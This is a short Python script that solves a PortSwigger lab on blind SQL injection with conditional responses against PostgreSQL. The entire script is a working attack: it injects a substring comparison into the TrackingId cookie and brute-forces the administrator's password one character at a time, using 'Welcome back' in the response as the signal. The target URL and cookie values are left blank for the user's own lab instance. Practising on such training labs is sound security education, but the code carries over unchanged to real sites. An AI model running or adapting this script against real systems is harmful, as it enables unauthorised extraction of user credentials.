"""Blind SQL injection with conditional responses.

Lab:  https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
DBMS: PostgreSQL
"""

import string
from urllib.parse import quote

import requests

alphabet = list(string.ascii_lowercase + string.digits)

# --- Fill these from your own live PortSwigger lab instance (Burp / DevTools) ---
# Lab instances are ephemeral, so these values expire. Replace before running:
#   url          -> your lab's base URL, e.g. "https://<id>.web-security-academy.net/"
#   tracking_id  -> current value of the TrackingId cookie (before the injection)
#   session      -> current value of the session cookie (see cookies dict below)
url = ""  # e.g. "https://<id>.web-security-academy.net/"
tracking_id = ""  # value of the TrackingId cookie, e.g. "XXXXXXXXXXXXXXXX"
session_cookie = (
    ""  # value of the "session" cookie, e.g. "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
)

session = requests.session()
password = ""

for i in range(1, 21):
    is_found = False

    for char in alphabet:
        raw = f"{tracking_id}' and substring((select Password from Users where Username = 'administrator' ) , {i}, 1) = '{char}' -- "
        cookies = {
            "TrackingId": quote(raw, safe=""),
            "session": session_cookie,
        }

        response = session.get(url, cookies=cookies, timeout=10)

        if "Welcome back" in response.text:
            password += char
            is_found = True
            print(f"The character at position {i} is: {char}")
            break

    if not is_found:
        print(f"No character found at position {i}. Stopping search.")
        break

print(f"The password is: {password}")
